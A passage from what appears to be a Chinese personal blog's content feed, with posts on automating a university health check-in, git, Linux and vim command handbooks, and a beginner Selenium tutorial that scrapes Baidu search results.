style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:center">selenium模拟</td><td style="text-align:left"></td><td style="text-align:left"></td></tr></tbody></table><ol><li><strong>编写快捷指令</strong></li><li></li></ol><h2 id="21-ios系统"><a class="markdownIt-Anchor" href="#21-ios系统"></a> 2.1  IOS系统</h2><p>iPhone和iPad可以使用快捷指令，体验感较好。</p><p>But最近i南航签到界面增加了字段，目前（2022年4月13日）打卡虽然可以成功，但是健康码是黄色的。快捷指令的作者当前未更新，自己不会改。🥦</p><p>(2022年4月14日)打卡恢复正常。</p><ul><li><p><a href="https://blog.cvvv.me/posts/a67c.html" target="_blank" rel="noopener">博客教程：使用快捷指令自动进行i·南航健康打卡</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1CY41137Af" target="_blank" rel="noopener">B站教程：【南航】【i南航打卡】iOS/iPadOS快捷指令i南航自动打卡教程</a></p></li></ul><h2 id="22-linux客户机或服务器"><a class="markdownIt-Anchor" href="#22-linux客户机或服务器"></a> 2.2 Linux客户机或服务器</h2><p>wood的项目：<a href="https://github.com/Wood1314/inuaa" target="_blank" rel="noopener">i南航校外自动打卡小工具</a></p><h2 id="23-windows待完成"><a class="markdownIt-Anchor" href="#23-windows待完成"></a> 2.3 Windows（待完成）</h2><p>上面wood的项目是通过Linux服务器运行脚本，邮件通知提醒打卡成功。</p><p>对脚本稍作修改，迁移到Windows上来，实现定时运行脚本+Windows自带的消息通知。</p>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git操作手册</title>
      <link href="/2022/04/13/git%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/"/>
      <url>/2022/04/13/git%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-命令"><a class="markdownIt-Anchor" href="#1-命令"></a> 1 命令</h1><ul><li>show-log</li><li>show-diff</li><li>pull：大致上 git pull = git fetch + git merge</li><li>commit</li><li>push</li><li>rebase：可以对某一段线性提交历史进行编辑、删除、复制、粘贴 <a href="https://www.yiibai.com/git/git_rebase.html" target="_blank" rel="noopener">git rebase命令</a></li><li>delete（rm）</li><li>revert</li><li>新建本地分支</li><li>推到远程分支</li><li>切分支</li><li>cherry-pick</li><li>解冲突</li><li>.gitignore</li></ul><h1 id="2-举例"><a class="markdownIt-Anchor" href="#2-举例"></a> 2 举例</h1><h2 id="21-对方更新过代码然后自己也需要上传新增文件"><a class="markdownIt-Anchor" href="#21-对方更新过代码然后自己也需要上传新增文件"></a> 2.1 对方更新过代码，然后自己也需要上传新增文件</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拉下更新代码</span></span><br><span class="line">git pull</span><br><span class="line">git pull origin master:master</span><br><span class="line"><span class="comment"># 详细的。。。</span></span><br><span class="line">git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br><span class="line"><span class="comment"># 新增文件</span></span><br><span class="line">···</span><br><span class="line"><span class="comment"># 将所有新增文件添加到暂存区</span></span><br><span class="line">git add .</span><br><span class="line"><span class="comment"># 将暂存区内容添加到本地仓库中</span></span><br><span class="line">git commit -m <span class="string">"注释"</span></span><br><span class="line"><span class="comment"># 从将本地的分支版本上传到远程并合并</span></span><br><span class="line">git push</span><br><span class="line">git push origin master:master</span><br><span class="line"><span class="comment"># 详细的。。。</span></span><br><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt;</span><br><span class="line">git push &lt;远程主机名&gt; &lt;本地分支名&gt; <span class="comment"># 如果本地分支名与远程分支名相同，则可以省略冒号</span></span><br></pre></td></tr></table></figure><h2 id="22-贡献自己的代码"><a class="markdownIt-Anchor" href="#22-贡献自己的代码"></a> 2.2 贡献自己的代码</h2><p><strong>commit-&gt;pull-&gt;push-&gt;MR</strong></p><p><strong>冲突：resolved-&gt;修改（edited）-&gt;完成（resolved）</strong></p><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li><a href="https://www.runoob.com/git/git-tutorial.html" target="_blank" rel="noopener">菜鸟教程——git</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux操作手册</title>
      <link href="/2022/04/13/Linux%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/"/>
      <url>/2022/04/13/Linux%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-命令"><a class="markdownIt-Anchor" href="#1-命令"></a> 1 命令</h1><h2 id="11-基本"><a class="markdownIt-Anchor" href="#11-基本"></a> 1.1 基本</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">touch file <span class="comment">#创建文件</span></span><br><span class="line">mkdir dir <span class="comment">#新建目录</span></span><br><span class="line">cp -r src target <span class="comment">#复制文件(夹)</span></span><br><span class="line">rm -rf dir <span class="comment">#强制删除文件(夹)</span></span><br><span class="line">mv src target <span class="comment">#移动或重命名文件(夹)</span></span><br><span class="line"><span class="built_in">cd</span> <span class="comment">#切换目录</span></span><br><span class="line"><span class="built_in">pwd</span> <span class="comment">#查看当前目录</span></span><br><span class="line">man &lt;command_name&gt; <span class="comment">#获得某个命令的说明和使用方式的详细介绍</span></span><br><span class="line">who am i <span class="comment">#查看用户</span></span><br><span class="line">su &lt;user&gt; <span class="comment">#可以切换到用户 user</span></span><br><span class="line">su - &lt;user&gt; <span class="comment">#切换用户，但是同时用户的环境变量和工作目录也会跟着改变成目标用户所对应的</span></span><br><span class="line">sudo adduser &lt;user&gt; <span class="comment">#新建用户</span></span><br><span class="line">groups &lt;user&gt; <span class="comment">#查看自己属于的用户组</span></span><br><span class="line">sudo usermod -G sudo &lt;user&gt; <span class="comment">#将用户添加到sudo用户组</span></span><br><span class="line">sudo deluser &lt;user&gt; --remove-home <span class="comment">#删除用户，参数是在删除用户时候会一并将该用户的工作目录一并删除</span></span><br><span class="line">sudo groupdel &lt;group&gt; <span class="comment">#删除用户组，倘若该群组中仍包括某些用户，则必须先删除这些用户后，才能删除群组</span></span><br><span class="line"><span class="comment"># 修改权限</span></span><br><span class="line">chmod 777 file <span class="comment">#读写执行rwx二进制位数分别是210，文件有三组固定的权限，拥有者，所属用户组，其他用户</span></span><br><span class="line">chmod gou-rw file <span class="comment">#g(group用户组)、o(others其他用户)、u(user用户)，+ - 表示增加和去掉相应的权限</span></span><br><span class="line">file &lt;file&gt; <span class="comment">#查看文件类型</span></span><br><span class="line"><span class="comment">#查看文件</span></span><br><span class="line">cat -n file <span class="comment">#参数是显示行号</span></span><br><span class="line">nl -b a file <span class="comment">#与上面一样</span></span><br><span class="line">nl -b t file <span class="comment">#只列出非空行，默认</span></span><br><span class="line">head/tail -n 1 file <span class="comment">#只看文件首部尾部一行</span></span><br><span class="line">head/tail -f file <span class="comment">#这个参数可以实现不停地读取某个文件的内容并显示，实现实时监视</span></span><br></pre></td></tr></table></figure><h2 id="12-压缩解压"><a class="markdownIt-Anchor" href="#12-压缩解压"></a> 1.2 压缩/解压</h2><h3 id="121-gzip"><a class="markdownIt-Anchor" href="#121-gzip"></a> 1.2.1 gzip</h3><ul><li><p>压缩后的格式为：*.gz</p></li><li><p>这种压缩方式不能保存原文件；且不能压缩目录</p></li><li><p>命令举例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">压缩</span></span><br><span class="line">gzip file</span><br><span class="line"><span class="meta">#</span><span class="bash">解压</span></span><br><span class="line">gunzip file.gz</span><br></pre></td></tr></table></figure></li></ul><h3 id="122-tar"><a class="markdownIt-Anchor" href="#122-tar"></a> 1.2.2 tar</h3><ul><li><p>命令选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-z(gzip)      用gzip来压缩/解压缩文件</span><br><span class="line">-j(bzip2)     用bzip2来压缩/解压缩文件</span><br><span class="line">-v(verbose)   详细报告tar处理的文件信息</span><br><span class="line">-c(create)    创建新的档案文件</span><br><span class="line">-x(extract)   解压缩文件或目录</span><br><span class="line">-f(file)      使用档案文件或设备，这个选项通常是必选的。</span><br></pre></td></tr></table></figure></li><li><p>命令举例</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">压缩</span></span><br><span class="line">tar -zvcf file.tar.gz file</span><br><span class="line">tar -jvcf file.tar.bz2 file</span><br><span class="line"><span class="meta">#</span><span class="bash">解压</span></span><br><span class="line">tar -zvxf file.tar.gz </span><br><span class="line">tar -jvxf file.tar.bz2</span><br></pre></td></tr></table></figure></li></ul><h3 id="123-zip"><a class="markdownIt-Anchor" href="#123-zip"></a> 1.2.3 zip</h3><ul><li><p>与gzip相比：1）可以压缩目录； 2）可以保留原文件</p></li><li><p>命令选项：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r(recursive)    递归压缩目录内的所有文件和目录</span><br></pre></td></tr></table></figure></li><li><p>命令举例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">压缩</span></span><br><span class="line">zip -r dir.zip dir</span><br><span class="line"><span class="meta">#</span><span class="bash">解压</span></span><br><span class="line">unzip dir.zip</span><br></pre></td></tr></table></figure></li></ul><h1 id="2-快捷键"><a class="markdownIt-Anchor" href="#2-快捷键"></a> 2 快捷键</h1><table><thead><tr><th style="text-align:center">按键</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center"><code>Ctrl+c</code></td><td style="text-align:center">强行终止当前程序</td></tr><tr><td style="text-align:center"><code>Ctrl+z</code></td><td style="text-align:center">将当前程序放到后台运行，恢复到前台为命令<code>fg</code></td></tr><tr><td style="text-align:center"><code>Ctrl+a</code></td><td style="text-align:center">将光标移至输入行头，相当于<code>Home</code>键</td></tr><tr><td style="text-align:center"><code>Ctrl+e</code></td><td style="text-align:center">将光标移至输入行末，相当于<code>End</code>键</td></tr><tr><td style="text-align:center"><code>Ctrl+k</code></td><td style="text-align:center">删除从光标所在位置到行末</td></tr><tr><td style="text-align:center"><code>Alt+Backspace</code></td><td style="text-align:center">向前删除一个单词</td></tr><tr><td style="text-align:center"><code>Shift+PgUp</code></td><td style="text-align:center">将终端显示向上滚动</td></tr><tr><td style="text-align:center"><code>Shift+PgDn</code></td><td style="text-align:center">将终端显示向下滚动</td></tr></tbody></table><h1 id="3-通配符"><a class="markdownIt-Anchor" href="#3-通配符"></a> 3 通配符</h1><table><thead><tr><th style="text-align:center">字符</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center"><code>*</code></td><td style="text-align:center">匹配 0 或多个字符</td></tr><tr><td style="text-align:center"><code>?</code></td><td style="text-align:center">匹配任意一个字符</td></tr><tr><td style="text-align:center"><code>[list]</code></td><td style="text-align:center">匹配 list 中的任意单一字符</td></tr><tr><td style="text-align:center"><code>[^list]</code></td><td style="text-align:center">匹配 除 list 中的任意单一字符以外的字符</td></tr><tr><td style="text-align:center"><code>[c1-c2]</code></td><td style="text-align:center">匹配 c1-c2 中的任意单一字符 如：[0-9][a-z]</td></tr><tr><td style="text-align:center"><code>{string1,string2,...}</code></td><td style="text-align:center">匹配 string1 或 string2 (或更多)其一字符串</td></tr><tr><td style="text-align:center"><code>{c1..c2}</code></td><td style="text-align:center">匹配 c1-c2 中全部字符 如{1…10}</td></tr></tbody></table><h1 id="4-目录结构"><a class="markdownIt-Anchor" href="#4-目录结构"></a> 4 目录结构</h1><img src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/4-1.png">]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vim操作手册</title>
      <link href="/2022/04/13/vim%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/"/>
      <url>/2022/04/13/vim%E6%93%8D%E4%BD%9C%E6%89%8B%E5%86%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-删除"><a class="markdownIt-Anchor" href="#1-删除"></a> 1 删除</h1><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">指令</th></tr></thead><tbody><tr><td style="text-align:center">删除某一行</td><td style="text-align:center">在VIM的命令模式下，使用<code>dd</code>，即可删除光标所在的行</td></tr><tr><td style="text-align:center">删除多行</td><td style="text-align:center">比如要删除8-17行，在VIM模式下，输入<code>:8,17d</code>，即可将8-17行全部删除，<strong>行号从1开始</strong></td></tr><tr><td style="text-align:center">删除全部内容</td><td style="text-align:center">在VIM的命令模式下，<code>ggdG</code></td></tr><tr><td style="text-align:center">误删后恢复</td><td style="text-align:center">在VIM命令模式下，输入<code>u</code>（与<code>u</code>相反的操作 <code>Ctrl+r</code>）</td></tr></tbody></table><h1 id="2-复制与粘贴"><a class="markdownIt-Anchor" href="#2-复制与粘贴"></a> 2 复制与粘贴</h1><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">指令</th></tr></thead><tbody><tr><td style="text-align:center">单行复制</td><td style="text-align:center">在光标的位置按<code>yy</code>，复制当前行； 然后再光标的行按<code>p</code>粘贴到下一行，原来的往下顺移</td></tr><tr><td style="text-align:center">多行复制</td><td style="text-align:center">在命令模式下，将光标移动到将要复制的首行处，按<code>nyy</code>复制标所在的向下n行(其中n为1、2、3…)</td></tr><tr><td style="text-align:center">粘贴</td><td style="text-align:center"><code>p</code>为将已经复制的数据在光标下一行粘贴；<code>P</code>为将已经复制的数据在光标上一行粘贴</td></tr></tbody></table><h1 id="3-查找"><a class="markdownIt-Anchor" href="#3-查找"></a> 3 查找</h1><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">指令</th></tr></thead><tbody><tr><td style="text-align:center"><code>/word</code></td><td style="text-align:center">在文件中查找内容为word的字符串（向下查找）</td></tr><tr><td style="text-align:center"><code>?word</code></td><td style="text-align:center">在文件中查找内容为word的字符串（向上查找）</td></tr><tr><td style="text-align:center"><code>n</code></td><td style="text-align:center">（先按<code>Enter</code>）表示重复查找动作，即查找下一个</td></tr><tr><td style="text-align:center"><code>N</code></td><td style="text-align:center">（先按<code>Enter</code>）反向查找下一个</td></tr></tbody></table><h1 id="5-跳到指定行"><a class="markdownIt-Anchor" href="#5-跳到指定行"></a> 5 跳到指定行</h1><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">指令</th></tr></thead><tbody><tr><td style="text-align:center">跳到第12行</td><td style="text-align:center">在VIM命令模式下，输入 <code>:12</code></td></tr><tr><td style="text-align:center">跳到最后一行</td><td style="text-align:center">在VIM命令模式下，输入 <code>G</code></td></tr><tr><td style="text-align:center">跳到最后一个字符</td><td style="text-align:center">在VIM命令模式下，输入 <code>G</code> ，之后按<code>$</code></td></tr><tr><td style="text-align:center">跳到第一行</td><td style="text-align:center">在VIM命令模式下，输入 <code>gg</code></td></tr></tbody></table><h1 id="6-替换"><a class="markdownIt-Anchor" href="#6-替换"></a> 6 替换</h1><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">指令</th></tr></thead><tbody><tr><td style="text-align:center"><code>:%s/s1/s2/</code></td><td style="text-align:center">用字符串s2替换每行的第一个字符串s1</td></tr><tr><td style="text-align:center"><code>:%s/s1/s2/g</code></td><td style="text-align:center">用字符串s2替换每行的所有字符串s1</td></tr></tbody></table><h1 id="7-显示行号"><a class="markdownIt-Anchor" href="#7-显示行号"></a> 7 显示行号</h1><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">指令</th></tr></thead><tbody><tr><td style="text-align:center">显示行号</td><td style="text-align:center">在VIM命令模式下，输入<code>:set nu</code></td></tr><tr><td style="text-align:center">取消显示行号</td><td style="text-align:center">在VIM命令模式下，输入<code>:set nonu</code></td></tr></tbody></table><h1 id="8-其他"><a class="markdownIt-Anchor" href="#8-其他"></a> 8 其他</h1><table><thead><tr><th style="text-align:center">操作</th><th style="text-align:center">指令</th></tr></thead><tbody><tr><td style="text-align:center">ctrl+s卡住</td><td style="text-align:center"><code>ctrl+q</code> 解除卡住</td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><h1 id="x-参考"><a class="markdownIt-Anchor" href="#x-参考"></a> X 参考</h1><ul><li>比较全的手册：<a href="https://www.cnblogs.com/h-c-g/p/11122899.html" target="_blank" rel="noopener">Vim复制一整行和复制多行</a></li><li><a href="https://blog.csdn.net/qiulinsama/article/details/88073663" target="_blank" rel="noopener">vi vim 字符串替换</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>selenium爬虫教程</title>
      <link href="/2022/04/11/selenium%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/"/>
      <url>/2022/04/11/selenium%E7%88%AC%E8%99%AB%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>Selenium最初是一个自动化测试工具，Selenium可以驱动浏览器自动执行自定义好的逻辑代码，即通过代码完全模拟使用浏览器自动访问目标站点并操作，所以也可以用来爬虫。</p><p>本次教程使用<code>Python3.9.9</code>，谷歌浏览器<code>版本 100.0.4896.75（正式版本） （64 位）</code>：</p><img src="https://s2.loli.net/2022/04/11/ShGQJUO7mYHkVKi.png" width="700" height="300" alt="图片名称" align="center" id="135"><h1 id="2-安装"><a class="markdownIt-Anchor" href="#2-安装"></a> 2 安装</h1><ol><li><p>安装selenium：<code>pip install selenium</code></p></li><li><p>安装谷歌浏览器驱动，版本要与上面的浏览器版本对应（版本不一定完全一致，尽量一致），<a href="https://chromedriver.chromium.org/downloads" target="_blank" rel="noopener">驱动下载链接</a></p><img src="https://s2.loli.net/2022/04/11/ZYPEVz83DrwC2m1.png" width="700" height="300" alt="图片名称" align="center" id="136"></li><li><p>将下载好的驱动文件解压后放到python安装路径下，使其生效：</p><img src="https://s2.loli.net/2022/04/11/Aom1YZhTpqMeVfQ.png" width="700" height="300" alt="图片名称" align="center" id="137"></li></ol><h1 id="3-样例"><a class="markdownIt-Anchor" href="#3-样例"></a> 3 样例</h1><p><strong>爬取百度搜索结果</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置浏览器</span></span><br><span class="line">co = webdriver.ChromeOptions()</span><br><span class="line">co.headless = <span class="literal">False</span></span><br><span class="line">browser = webdriver.Chrome(options=co)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开指定url</span></span><br><span class="line">browser.implicitly_wait(<span class="number">30</span>)</span><br><span class="line">url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">browser.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定位操作</span></span><br><span class="line">browser.find_element(by=By.ID, value=<span class="string">'kw'</span>).send_keys(<span class="string">"python"</span>)  <span class="comment"># 输入框</span></span><br><span class="line">browser.find_element(by=By.ID, value=<span class="string">'su'</span>).click()  <span class="comment"># 点击搜索按钮</span></span><br><span class="line">elements = browser.find_elements(by=By.CLASS_NAME, value=<span class="string">'c-container'</span>)  <span class="comment"># 查找到所有c-container类</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> elements:</span><br><span class="line">    span = element.find_element(by=By.TAG_NAME, value=<span class="string">'a'</span>)</span><br><span class="line">    print(span.text)</span><br><span class="line">    <span class="comment"># print(span.get_attribute('innerHTML'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 爬取完毕，退出浏览器</span></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">browser.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><hr><p><strong>代码解读</strong>：</p><ol><li><p>配置浏览器，当<code>co.headless = False</code>时候有界面化（默认）；当<code>co.headless = True</code>时为无头浏览器，也就是无界面化浏览器。</p></li><li><p>百度服务器响应存在延迟，所以很可能造成接下来的代码执行失败，因此执行 <code>browser.implicitly_wait(30)</code>。这样如果找不到元素，每隔<strong>半秒钟</strong>再去界面上查看一次， 直到找到该元素， 或者过了<code>30</code>秒最大时长。</p></li><li><p>利用chrome的f12开查找搜索框和搜索按钮的id：</p><img src="https://s2.loli.net/2022/04/11/lKTLUdZaOfH2SsD.png" width="800" height="300" alt="图片名称" align="center" id="138"><p>根据ID定位有两种写法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">browser.find_element_by_id(<span class="string">'kw'</span>)  <span class="comment"># 已废弃</span></span><br><span class="line">browser.find_element(by=By.ID, <span class="string">'kw'</span>)  <span class="comment"># 推荐</span></span><br></pre></td></tr></table></figure><p>第一种写法会报warning：<a href="https://blog.csdn.net/qq_45007567/article/details/120829410" target="_blank" rel="noopener">selenium弃用警告DeprecationWarning</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DeprecationWarning: find_element_by_* commands are deprecated. Please use find_element() instead</span><br><span class="line">  browser.find_element_by_id(<span class="string">'kw'</span>).send_keys(<span class="string">"python"</span>)  <span class="comment"># 输入框</span></span><br></pre></td></tr></table></figure><p><code>send_keys()</code>方法可以在对应的元素中输入字符串；<code>click()</code>方法是点击该元素。</p></li><li><p><code>find_elements()</code>返回的是找到的符合条件的<strong>所有</strong>元素，放在一个<strong>列表</strong>中返回；<code>find_element()</code>只会返回<strong>第一个</strong>元素。</p></li></ol><h1 id="4-定位元素"><a class="markdownIt-Anchor" href="#4-定位元素"></a> 4 定位元素</h1><p><code>find_elements()</code>返回的是找到的符合条件的<strong>所有</strong>元素，放在一个<strong>列表</strong>中返回；<code>find_element()</code>只会返回<strong>第一个</strong>元素。</p><h2 id="41-id"><a class="markdownIt-Anchor" href="#41-id"></a> 4.1 id</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"coolestWidgetEvah"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element = driver.find_element(by=By.ID, value=<span class="string">"coolestWidgetEvah"</span>)</span><br></pre></td></tr></table></figure><h2 id="42-class-name"><a class="markdownIt-Anchor" href="#42-class-name"></a> 4.2 class name</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cheese"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>Cheddar<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cheese"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>Gouda<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cheeses = driver.find_elements(By.CLASS_NAME, <span class="string">"cheese"</span>)</span><br></pre></td></tr></table></figure><h2 id="43-tag-name"><a class="markdownIt-Anchor" href="#43-tag-name"></a> 4.3 tag name</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"..."</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frame = driver.find_element(By.TAG_NAME, <span class="string">"iframe"</span>)</span><br></pre></td></tr></table></figure><h2 id="44-name"><a class="markdownIt-Anchor" href="#44-name"></a> 4.4 name</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"cheese"</span> <span class="attr">type</span>=<span class="string">"text"</span>/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cheese = driver.find_element(By.NAME, <span class="string">"cheese"</span>)</span><br></pre></td></tr></table></figure><h2 id="45-link-text"><a class="markdownIt-Anchor" href="#45-link-text"></a> 4.5 link text</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.google.com/search?q=cheese"</span>&gt;</span>cheese<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cheese = driver.find_element(By.PARTIAL_LINK_TEXT, <span class="string">"cheese"</span>)</span><br></pre></td></tr></table></figure><h2 id="46-partial-link-text"><a class="markdownIt-Anchor" href="#46-partial-link-text"></a> 4.6 Partial Link Text</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.google.com/search?q=cheese"</span>&gt;</span>search for cheese<span 